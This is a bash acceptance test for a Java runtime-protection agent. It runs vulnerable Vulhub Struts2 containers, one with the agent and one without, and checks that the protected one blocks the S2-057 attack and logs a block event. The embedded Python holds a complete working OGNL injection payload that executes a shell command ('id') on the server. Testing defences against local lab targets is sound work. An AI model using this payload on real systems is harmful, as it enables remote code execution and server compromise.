#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_STRUTS2_S2057_IMAGE:-vulhub/struts2:2.3.34-showcase}"
baseline_name="${OHMYRASP_VULHUB_STRUTS2_S2057_BASELINE_NAME:-ohmyrasp-vulhub-struts2-s2057-baseline}"
protected_name="${OHMYRASP_VULHUB_STRUTS2_S2057_PROTECTED_NAME:-ohmyrasp-vulhub-struts2-s2057-protected}"
baseline_port="${OHMYRASP_VULHUB_STRUTS2_S2057_BASELINE_PORT:-18536}"
protected_port="${OHMYRASP_VULHUB_STRUTS2_S2057_PROTECTED_PORT:-18537}"
host_config="${OHMYRASP_VULHUB_STRUTS2_S2057_CONFIG:-/tmp/vulhub-ohmyrasp-20260603/struts2/s2-057/struts-actionchaining.xml}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-struts2-s2-057-java8-baseline"
protected_dir="logs/vulhub-struts2-s2-057-java8-protected"
protected_log="${protected_dir}/events.jsonl"

if [[ ! -f "$host_config" ]]; then
  echo "missing Vulhub Struts2 S2-057 action-chain override: ${host_config}" >&2
  exit 1
fi

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" -p "${baseline_port}:8080" \
  -v "${host_config}:/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/struts-actionchaining.xml:ro" \
  "$image" >/dev/null

docker run -d --name "$protected_name" -p "${protected_port}:8080" \
  -v "${host_config}:/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/struts-actionchaining.xml:ro" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e CATALINA_OPTS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 240); do
    status="$(curl -sS -o "/tmp/${name}.html" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" || true)"
    if [[ "$status" == "200" ]]; then
      return
    fi
    sleep 1
  done
  echo "${name} did not expose Struts2 showcase root at ${port}" >&2
  exit 1
}

run_attack() {
  local port="$1"
  local output="$2"
  python3 - "$port" "$output" <<'PY'
import http.client
import sys
import urllib.parse

port = int(sys.argv[1])
output = sys.argv[2]
payload = (
    "${"
    "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    "(#ct=#request['struts.valueStack'].context)."
    "(#cr=#ct['com.opensymphony.xwork2.ActionContext.container'])."
    "(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    "(#ou.getExcludedPackageNames().clear())."
    "(#ou.getExcludedClasses().clear())."
    "(#ct.setMemberAccess(#dm))."
    "(#a=@java.lang.Runtime@getRuntime().exec('id'))."
    "(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))"
    "}"
)
path = f"/struts2-showcase/{urllib.parse.quote(payload, safe='')}/actionChain1.action"
connection = http.client.HTTPConnection("127.0.0.1", port, timeout=20)
try:
    connection.request("GET", path, headers={"User-Agent": "ohmyrasp-s2-057"})
    response = connection.getresponse()
    body = response.read()
finally:
    connection.close()

with open(output, "wb") as handle:
    handle.write(f"HTTP/1.1 {response.status} {response.reason}\n".encode())
    for key, value in response.getheaders():
        handle.write(f"{key}: {value}\n".encode(errors="replace"))
    handle.write(b"\n")
    handle.write(body)
print(response.status)
PY
}

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"

if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup event in Struts2 S2-057 protected container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "Struts2 S2-057 protected startup/readiness produced a detection before the exploit request" >&2
  exit 1
fi

baseline_status="$(run_attack "$baseline_port" "${baseline_dir}/attack.response")"
if [[ "$baseline_status" != "302" ]] || ! grep -q 'uid=' "${baseline_dir}/attack.response"; then
  sed -n '1,200p' "${baseline_dir}/attack.response" >&2 || true
  echo "baseline Struts2 S2-057 namespace OGNL did not return id output; status=${baseline_status}" >&2
  exit 1
fi

protected_status="$(run_attack "$protected_port" "${protected_dir}/attack.response")"
if grep -q 'uid=' "${protected_dir}/attack.response"; then
  sed -n '1,200p' "${protected_dir}/attack.response" >&2 || true
  echo "protected Struts2 S2-057 namespace OGNL returned command output despite Java8 RASP; status=${protected_status}" >&2
  exit 1
fi
for _ in $(seq 1 30); do
  if grep -q '"algorithm":"java8_command_execution_exploit_primitive".*"action":"block"' "$protected_log"; then
    echo "vulhub Struts2 S2-057 Java8 acceptance passed"
    exit 0
  fi
  sleep 1
done

cat "$protected_log" >&2
echo "missing java8_command_execution_exploit_primitive block event for Struts2 S2-057" >&2
exit 1
